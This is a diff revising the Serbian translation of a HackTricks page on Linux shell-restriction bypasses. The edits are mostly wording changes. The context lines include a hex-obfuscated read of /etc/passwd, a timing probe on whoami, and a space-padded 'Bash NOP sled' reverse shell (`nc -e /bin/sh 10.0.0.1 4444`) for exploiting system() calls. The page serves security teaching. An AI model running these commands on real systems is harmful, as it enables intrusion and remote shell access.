@@ -2,7 +2,7 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Uobičajeni zaobilaženja ograničenja
+## Uobičajeni Obilazi Ograničenja
 
 ### Reverse Shell
 ```bash
@@ -133,7 +133,7 @@ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```bash
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
-### Dobijanje karaktera iz promenljivih okruženja
+### Dobijanje karaktera iz Env promenljivih
 ```bash
 echo ${LS_COLORS:10:1} #;
 echo ${PATH:0:1} #/
@@ -298,11 +298,13 @@ ln /f*
 
 Ako ste unutar datotečnog sistema sa **read-only i noexec zaštitama** ili čak u distroless kontejneru, još uvek postoje načini da **izvršite proizvoljne binarne datoteke, čak i shell!:**
 
+
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
 ## Chroot & other Jails Bypass
+
 
 {{#ref}}
 ../privilege-escalation/escaping-from-limited-bash.md
@@ -310,7 +312,7 @@ bypass-fs-protections-read-only-no-exec-distroless/
 
 ## Space-Based Bash NOP Sled ("Bashsledding")
 
-Kada ranjivost omogućava da delimično kontrolišete argument koji na kraju dolazi do `system()` ili drugog shella, možda ne znate tačno pomeranje na kojem izvršavanje počinje da čita vaš payload. Tradicionalni NOP sledovi (npr. `\x90`) **ne** rade u sintaksi shella, ali Bash će bezopasno ignorisati vodeći razmak pre izvršavanja komande.
+Kada ranjivost omogućava delimičnu kontrolu nad argumentom koji na kraju dolazi do `system()` ili drugog shella, možda nećete znati tačan pomak na kojem izvršavanje počinje da čita vaš payload. Tradicionalni NOP sledovi (npr. `\x90`) **ne** rade u sintaksi shella, ali Bash će bezopasno ignorisati vodeći razmak pre izvršavanja komande.
 
 Stoga možete kreirati *NOP sled za Bash* tako što ćete prefiksirati svoju pravu komandu dugim nizom razmaka ili tab karaktera:
 ```bash
@@ -318,7 +320,7 @@ Stoga možete kreirati *NOP sled za Bash* tako što ćete prefiksirati svoju pra
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-Ako ROP lanac (ili bilo koja primitivna greška u memoriji) dovede pokazivač instrukcija bilo gde unutar bloka prostora, Bash parser jednostavno preskoči razmake dok ne dođe do `nc`, pouzdano izvršavajući vašu komandu.
+Ako ROP lanac (ili bilo koja primitivna tehnika korupcije memorije) dovede pokazivač instrukcija bilo gde unutar bloka prostora, Bash parser jednostavno preskoči razmake dok ne dođe do `nc`, pouzdano izvršavajući vašu komandu.
 
 Praktične upotrebe:
 
@@ -328,7 +330,7 @@ Praktične upotrebe:
 
 > 🛠️  Kombinujte ovu trik sa ROP gadgetima koji pozivaju `system()` da dramatično povećate pouzdanost eksploatacije na IoT ruterima sa ograničenom memorijom.
 
-## Reference i više
+## Reference & Više
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
